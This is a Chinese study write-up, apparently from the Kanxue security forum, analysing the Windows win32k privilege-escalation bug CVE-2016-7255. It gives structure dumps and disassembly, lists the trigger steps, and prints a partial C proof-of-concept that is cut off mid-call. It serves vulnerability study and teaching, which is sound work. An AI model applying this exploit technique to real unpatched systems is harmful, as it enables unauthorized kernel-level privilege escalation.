---
title: CVE-2016-7255提权漏洞学习笔记
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458495053&idx=1&sn=e037fbe4c1ee7d86342985897cf1e6f5&chksm=b18e98c786f911d13201a01d3626398637a97f524d39d9cf191d212505874b40e2097f7fe9a3&scene=58&subscene=0#rd
source: 看雪学院
date: 2023-02-23
fetch_date: 2025-10-04T07:51:23.178126
---

# CVE-2016-7255提权漏洞学习笔记

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GuYeECVMQo3jVciatz99jWt0xSY0dYWUKnsiakIN0WSRfN2Esj9SHU9Xz5spGAdjzKtEqRzHHEqnRA/0?wx_fmt=jpeg)

# CVE-2016-7255提权漏洞学习笔记

1900

看雪学苑

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GuYeECVMQo3jVciatz99jWthIJAF0uMvPI06IiaJlHJMKEuYre15Vsaa6zObfHribKNuAppT5s0erGg/640?wx_fmt=jpeg)

本文为看雪论坛优秀文章

看雪论坛作者ID：1900

#

```
一

前言
```

##

## **1.漏洞描述**

该漏洞存在于win32k中的xxxNextWindow函数中，该函数没有对tagWND对象的spmenu成员的合法性进行验证，就直接将其作为合法地址进行读写，导致了BSOD的产生。通过将spmenu设置为特定的值，可以让tagWND对象获得越界写入的能力，从而修改其他tagWND的strName->Buffer的值，实现任意地址写入，最终实现提权。

##

## **2.实验环境**

* 操作系统：Win 7 x86 sp1 专业版
* 编译器：Visual Studio 2017
* 调试器：IDA Pro, WinDbg

#

#

```
二

漏洞分析
```

##

## **1.漏洞成因**

xxxNextWindow函数的第一个参数指向tagQ结构体，该结构体定义如下：

```
kd> dt win32k!tagQ   +0x000 mlInput          : tagMLIST   +0x00c ptiSysLock       : Ptr32 tagTHREADINFO   +0x010 idSysLock        : Uint4B   +0x014 idSysPeek        : Uint4B   +0x018 ptiMouse         : Ptr32 tagTHREADINFO   +0x01c ptiKeyboard      : Ptr32 tagTHREADINFO   +0x020 spwndCapture     : Ptr32 tagWND   +0x024 spwndFocus       : Ptr32 tagWND   +0x028 spwndActive      : Ptr32 tagWND   +0x02c spwndActivePrev  : Ptr32 tagWND   +0x030 codeCapture      : Uint4B   +0x034 msgDblClk        : Uint4B   +0x038 xbtnDblClk       : Uint2B   +0x03c timeDblClk       : Uint4B   +0x040 hwndDblClk       : Ptr32 HWND__   +0x044 ptDblClk         : tagPOINT   +0x04c ptMouseMove      : tagPOINT   +0x054 afKeyRecentDown  : [32] UChar   +0x074 afKeyState       : [64] UChar   +0x0b4 caret            : tagCARET   +0x0ec spcurCurrent     : Ptr32 tagCURSOR   +0x0f0 iCursorLevel     : Int4B   +0x0f4 QF_flags         : Uint4B   +0x0f8 cThreads         : Uint2B   +0x0fa cLockCount       : Uint2B   +0x0fc msgJournal       : Uint4B   +0x100 ExtraInfo        : Int4B   +0x104 ulEtwReserved1   : Uint4B
```

tagQ结构体中有许多成员指向tagWND结构体，该结构体定义如下：

```
kd> dt win32k!tagWND   +0x000 head             : _THRDESKHEAD   +0x014 state            : Uint4B   +0x018 state2           : Uint4B   +0x01c ExStyle          : Uint4B   +0x020 style            : Uint4B   +0x024 hModule          : Ptr32 Void   +0x028 hMod16           : Uint2B   +0x02a fnid             : Uint2B   +0x02c spwndNext        : Ptr32 tagWND   +0x030 spwndPrev        : Ptr32 tagWND   +0x034 spwndParent      : Ptr32 tagWND   +0x038 spwndChild       : Ptr32 tagWND   +0x03c spwndOwner       : Ptr32 tagWND   +0x040 rcWindow         : tagRECT   +0x050 rcClient         : tagRECT   +0x060 lpfnWndProc      : Ptr32     long    +0x064 pcls             : Ptr32 tagCLS   +0x068 hrgnUpdate       : Ptr32 HRGN__   +0x06c ppropList        : Ptr32 tagPROPLIST   +0x070 pSBInfo          : Ptr32 tagSBINFO   +0x074 spmenuSys        : Ptr32 tagMENU   +0x078 spmenu           : Ptr32 tagMENU   +0x07c hrgnClip         : Ptr32 HRGN__   +0x080 hrgnNewFrame     : Ptr32 HRGN__   +0x084 strName          : _LARGE_UNICODE_STRING   +0x090 cbwndExtra       : Int4B   +0x094 spwndLastActive  : Ptr32 tagWND   +0x098 hImc             : Ptr32 HIMC__   +0x09c dwUserData       : Uint4B   +0x0a0 pActCtx          : Ptr32 _ACTIVATION_CONTEXT   +0x0a4 pTransform       : Ptr32 _D3DMATRIX   +0x0a8 spwndClipboardListenerNext : Ptr32 tagWND   +0x0ac ExStyle2         : Uint4B
```

xxxNextWindow会从tagQ中取出偏移0x28的spwndActive作为参数调用GetNextQueueWindow，spwndActive代表当前活跃的窗口，函数GetNextQueueWindow会将spwndActive偏移0x38保存的子窗口spwndChild返回：

```
.text:BF9684C5                 mov     edi, [ebx+28h]  ; 将spwndActive赋值给edi.text:BF968533                 push    1.text:BF968535                 push    [ebp+hDC].text:BF968538                 push    edi.text:BF968539                 call    __GetNextQueueWindow@12 .text:BF96853E                 mov     ebx, eax        ; 将spwndChild赋给ebx
```

验证GetNextQueueWindow返回的tagWND偏移0x78处保存的spmenu成员是否为0，如果不为0，将对spmenu偏移0x14处指向的地址进行或运算：

```
.text:BF96859C                 xor     ecx, ecx     .text:BF96859E                 cmp     [ebx+78h], ecx  ; 判断spmenu是否为0.text:BF9685A1                 jz      short loc_BF9685AA.text:BF9685A3                 mov     eax, [ebx+78h]         ; 将spmenu赋给eax.text:BF9685A6                 or      dword ptr [eax+14h], 4 ; 将flags与4进行或运算
```

spmenu是一个tagMENU对象，该对象部分成员如下，所以上面的代码其实是想对tagMENU的flags成员进行或运算。

```
kd> dt win32k!tagMENU   +0x000 head             : _PROCDESKHEAD   +0x014 fFlags           : Uint4B   +0x018 iItem            : Int4B
```

在进行或运算之前，函数只是验证了tagWND->spmenu是否为0，却没有验证tagWND->spmenu所指的内存是否有效，而spmenu可以通过函数SetWindowLong修改，该函数定义如下：

```
LONG SetWindowLong(HWND hWnd,int nIndex, LONG dwNewLong);
```

SetWindowLong函数会调用内核的xxxSetWindowLong函数实现功能，在xxxSetWindowLong函数中会判断nIndex是否小于0：

```
.text:BF8B40E0                 mov     edx, [ebp+nIndex] ; nIndex赋值edx.text:BF8B40EB                 push    0.text:BF8B40ED                 pop     ecx             ; ecx请0.text:BF8B4134                 cmp     edx, ecx        ; edx是否小于0，小于则跳转.text:BF8B4136                 jl      short loc_BF8B419E
```

如果nIndex小于0，则会调用xxxSetWindowData函数：

```
.text:BF8B419E loc_BF8B419E:                           ; CODE XREF: xxxSetWindowLong(x,x,x,x,x)+4F↑j.text:BF8B419E                                         ; xxxSetWindowLong(x,x,x,x,x)+80↑j.text:BF8B419E                 push    [ebp+arg_C].text:BF8B41A1                 push    [ebp+dwNewLong].text:BF8B41A4                 push    edx.text:BF8B41A5                 push    esi.text:BF8B41A6                 call    _xxxSetWindowData@16 ; xxxSetWindowData(x,x,x,x).text:BF8B41AB                 jmp     loc_BF8B4234
```

xxxSetWindowData函数会判断nIndex是否等于-12：

```
.text:BF8BB79E                 mov     eax, [ebp+nIndex].text:BF8BB7C2                 cmp     eax, 0FFFFFFF4h.text:BF8BB7C5                 jz      loc_BF8BBA1C
```

如果nIndex为-12，继续判断tagWND->style的最高位是否为0x40，如果是，则将dwNewLong赋值给窗口的spmenu：

```
.text:BF8BBA1C loc_BF8BBA1C:                           .text:BF8BBA1C                 mov     edi, [ebp+tagWND].text:BF8BBA1F                 mov     al, [edi+23h].text:BF8BBA22                 and     al, 0C0h.text:BF8BBA24                 cmp     al, 40h.text:BF8BBA26                 jnz     short loc_BF8BBA33.text:BF8BBA28                 mov     eax, [ebp+dwNewLong].text:BF8BBA2B                 mov     ebx, [edi+78h].text:BF8BBA2E                 mov     [edi+78h], eax  ; 将dwNewLong赋值给tagWND->spmenu.text:BF8BBA31                 jmp     short loc_BF8BBA88
```

根据以下定义可以知道，当对带有WS\_CHILD标记的窗口调用SetWindowLong的时候，如果第二个参数传入GWL\_ID，第三个参数的值就会写入到窗口的spmenu中：

```
#define WS_CHILD            0x40000000L#define GWL_ID              (-12)
```

因此，用户可以修改窗口的spmenu，如果将它修改为一个非法的地址，再调用xxxNextWindow函数，就会因为对一个非法地址进行或运算导致BSOD的产生。

对上述内容的总结如下：

漏洞函数xxxNextWindow的执行流程是：1) 获取当前活跃窗口;2) 从当前活跃窗口中获取子窗口;3) 对子窗口的spmenu成员0x14所指的内存地址进行或运算。

想要在用户层修改窗口的spmenu成员，要满足的条件：1) 被修改的窗口具有WS\_CHILD标记. 2) 调用SetWindowLong的时候第二个参数指定为GWL\_ID。

##

## **2.漏洞触发**

xxxNextWindow函数需要通过发送Alt + Esc的按键信息来调用，因此漏洞触发的步骤如下：

① 获取桌面窗口句柄作为父窗口。

② 创建一个用来触发漏洞的攻击窗口，该窗口的父窗口需要指定为桌面窗口。

③ 设置攻击窗口带有WS\_CHILD标记，通过SetWindowLong修改攻击窗口的spmenu，将其指向非法内存地址。

④ 将桌面窗口置于最顶层，即将其变成活跃窗口。

⑤ 模拟Alt + Esc按键调用xxxNextWindow函数。

相应的POC代码如下：

```
BOOL POC_CVE_2016_7255(){    BOOL bRet = TRUE;    HWND hwnd = NULL, hDesktop = NULL;    WNDCLASSEX wc = { 0 };    char *pClassName = "POC";
    // 获取父窗口    hDesktop = GetDesktopWindow();    if (!hDesktop)    {        bRet = FALSE;        ShowError("GetDesktopWindow", GetLastError());        goto exit;    }
    memset(&wc, 0, sizeof(wc));    wc.cbSize = sizeof(wc);    wc.hInstance = GetModuleHandle(NULL);    wc.lpfnWndProc = DefWindowProc;    wc.lpszClassName = pClassName;
    if (!RegisterClassEx(&wc))    {        bRet = FALSE;        ShowError("RegisterClassEx", GetLastError());        goto exit;    }
    // 创建触发漏洞的窗口    hwnd = CreateWindowEx(NULL,                           pClassName,                          NULL,                          WS_VISIBLE,                          0, 0, 100, 100,                           hDesktop,           // 指定父窗口为桌面窗口                          0,                          Get...